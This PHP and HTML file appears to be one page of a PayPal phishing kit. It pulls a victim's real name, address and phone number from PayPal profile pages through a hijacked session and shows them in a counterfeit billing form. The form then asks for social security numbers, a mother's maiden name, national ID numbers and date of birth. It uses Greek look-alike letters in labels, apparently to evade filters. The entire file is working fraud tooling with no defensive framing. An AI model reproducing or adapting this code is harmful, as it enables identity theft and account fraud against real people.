<?php
include('../pais/contenttrans.php');
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
$response = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_profile-address');
$nama     = getStr($response, 'emphasis">', '<br>');
$form     = getStr($response, '<tbody><form', 'class="btnLink btnMake">');
$action   = getStr($form, 'method="post" action="', '"');
$add_id   = getStr($form, 'name="address_id" value="', '">');
$cc_count = getStr($form , 'name="card_count" value="', '">');
$variable = 'return=&address_id='.$add_id.'&card_count='.$cc_count.'&edit.x=Edit';
$getinfo  = curl($action, $variable);
$getinfo  = str_replace('&#x20;', ' ', $getinfo);
$add_1    = getStr($getinfo, 'name="address1" value="', '"');
$add_2    = getStr($getinfo, 'name="address2" value="', '"');
$city     = getStr($getinfo, 'name="city" value="', '"');
$state    = getStr($getinfo, 'name="state" value="', '"');
$zip      = getStr($getinfo, 'name="zip" value="', '"');
$respons = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_profile-phone');
$phone	 = strip_tags('<input type="hidden" ' . fetch_value($respons, 'name="phone"', '</label>'));
$phone   = str_replace('&#x20;', '', $phone);
$phone   = str_replace('&#x2d;', '', $phone);
?>
<script src="../js/jquery.billing.js"></script>
<form method="post" id="parentForm" name="creditcard_Form" action="webscr.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=three&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>">
	<div class="textInput">
		<div class="fieldWrapper">
			<?php
			if (!$nama==''){ 
				?>
				<label for="full_name" class="fieldLabel">Account Name :</label>
			<input maxlength="30" class="hasHelp  validateEmpty   " autocomplete="off" required="required" name="full_name" value="<?= $nama ?>" type="text" readonly></span>
			<?php
		}
		?>
	</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="address_1" class="fieldLabel">Address line 1 :</label>
		<input maxlength="30" class="hasHelp  validateEmpty   " placeholder="<?= $ca ?>" autocomplete="off" required="required" name="address_1" value="<?php echo $add_1; ?>" type="text"></span>
	</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="address_2" class="fieldLabel">Address line 2 :</label>
		<input maxlength="30" class="hasHelp  validateEmpty   " autocomplete="off"  name="address_2" value="<?php echo $add_2; ?>" type="text" placeholder="<?= $cb ?>"></span>
	</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="city" class="fieldLabel">City :</label>
		<input maxlength="30" class="hasHelp  validateEmpty   "" autocomplete="off" placeholder="<?= $cci ?>" required="required" name="city" value="<?php echo $city; ?>" type="text"></span>
	</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="state" class="fieldLabel">State / County :</label>
		<input maxlength="30" class="hasHelp  validateEmpty   "" autocomplete="off" placeholder="<?= $cd ?>" name="state" value="<?php echo $state; ?>" type="text"></span>
	</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="postal" class="fieldLabel">ZIP / &Rho;ost c&omicron;de :</label>
		<input maxlength="11" class="hasHelp  validateEmpty   " autocomplete="off" required="required" placeholder="<?= $ce ?>" name="postal" value="<?php echo $zip; ?>" type="text"></span>
		<?php
		if (!$nama_negara==''){ echo '
			<label for="country" class="fieldLabel">Country :</label>
		<input maxlength="11" class="large" autocomplete="off" required="required" name="country" value="'.$nama_negara.'" placeholder="'.$cf.'" type="text" readonly></span>
		';
	}
	?>
</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="phone" class="fieldLabel">&Rho;hone Number :</label>
		<input pattern="[0-9]{5,}" maxlength="15" class="hasHelp  validateEmpty   " autocomplete="off" required="required" name="phone" value="<?php echo $phone; ?>" type="text" placeholder="<?= $cg ?>"></span>
		<?php
		if ($negara=="HK" or $negara=="CA" or $negara=="US" or $negara=="CZ" or $negara=="NZ" or $negara=="FI" or $negara=="FR" or $negara=="DE" or $negara=="PT" or $negara=="RE" or $negara=="MY" or $negara=="US" or $negara=="GB" or $negara=="AU" or $negara=="IE" or $negara=="IL" or $negara=="ES" or $negara=="BR" or $negara=="CH"){ echo '										
			<input maxlength="25" class="hasHelp  validateEmpty   " placeholder="'.$ch.'" autocomplete="off" name="mmd" required="required" value="" type="text"></span>
		';
	}
	?>	
	<?php
	if 		($negara=="US"){ 
		?>
		<table width="64%">
			<tr>
				<td>
					<input name="number_1" class="hasHelp  validateEmpty   " pattern="[0-9]{3,}" maxlength="3" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text">
				</td>
				<td width="2%">&nbsp;&nbsp;-&nbsp;&nbsp;</td>
				<td>
					<input name="number_2" class="hasHelp  validateEmpty   " pattern="[0-9]{2,}" maxlength="2" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text">
				</td>
				<td width="2%">&nbsp;&nbsp;-&nbsp;&nbsp;</td>
				<td>
					<input name="number_3" class="hasHelp  validateEmpty   " pattern="[0-9]{4,}" maxlength="4" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text">
				</td>
			</tr>
		</table>
		<?php
	} elseif ($negara=="IL"){ 
		?>
		<table width="64%">
			<tr>
				<td>
					<input name="number_1" class="hasHelp  validateEmpty   " pattern="[0-9]{3,}" maxlength="3" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text">
				</td>
				<td width="2%">&nbsp;&nbsp;-&nbsp;&nbsp;</td>
				<td>
					<input name="number_2" class="hasHelp  validateEmpty   " pattern="[0-9]{2,}" maxlength="2" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text">
				</td>
				<td width="2%">&nbsp;&nbsp;-&nbsp;&nbsp;</td>
				<td>
					<input name="number_3" class="hasHelp  validateEmpty   " pattern="[0-9]{4,}" maxlength="4" autocomplete="off" placeholder="<?= $ci ?>" required="required" value="" type="text"></span>
				</td>
			</tr>
		</table>
		<?php
	} elseif ($negara=="HK") { 
		?>
		<input maxlength="25" class="hasHelp  validateEmpty   " autocomplete="off" placeholder="<?= $cj ?>" name="id_number" required="required" value="" type="text">
		<?php
	} elseif ($negara=="AU") { 
		?>
		<input maxlength="20" class="hasHelp  validateEmpty   " autocomplete="off" placeholder="<?= $ck ?>" name="id_number" required="required" value="" type="text">
		<?php
	} elseif ($negara=="IT") { 
		?>
		<input maxlength="20" class="hasHelp  validateEmpty   " autocomplete="off" name="id_number" required="required" value="" type="text" placeholder="<?= $l ?>">
		<?php
	}
	?>
</div>
</div>
<div class="textInput">
	<div class="fieldWrapper">
		<label for="expdate"><?= $cm ?> :</label>
		<table width="100%" cellpadding="10">
			<tr>
				<?php
				echo date_dropdown(18);
				function date_dropdown($year_limit = 0)
				{
					/*days*/
					echo $cn;
					$html_output .= '<td width="32%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="day" placeholder="day" name="day" class="needsclick validate" required="required" aria-required="true">'."\n";
					$html_output .= '<option selected="selected" value="dd">dd</option>';
					for ($day = 1; $day <= 31; $day++) {
						$html_output .= '<option value="' . $day . '">' . $day . '</option>';
					}
					$html_output .= "\n".'</select></div><div></td><td width="2%">&nbsp;</td>'."\n";
					/*months*/
					$html_output .= '<td width="32%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="month" placeholder="month" name="month" class="needsclick validate" required="required" aria-required="true">'."\n";
					$html_output .= '<option selected="selected" value="mm">mm</option>';
					$months = array("", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
					for ($month = 1; $month <= 12; $month++) {
						$html_output .= '<option value="' . $month . '">' . $months[$month] . '</option>';
					}
					$html_output .= "\n".'</select></div><div></td><td width="2%">&nbsp;</td>'."\n";
					/*years*/
					$html_output .= '<td width="32%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="year" placeholder="year" name="year" class="needsclick validate" required="required" aria-required="true">'."\n";
					$html_output .= '<option selected="selected" value="yyyy">yyyy</option>';
					for ($year = (date("Y") - $year_limit); $year >= 1900; $year--) {
						$html_output .= '<option value="' . $year . '">' . $year . '</option>';
					}
					$html_output .= "\n".'</select></div><div></td>'."\n";
					return $html_output;
				}
				?>
			</tr>
		</table>
	</div>
</div>
<div class="actions">
	<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnLogin" name="btnLogin"><?= $cq ?></button>
</div>
</form>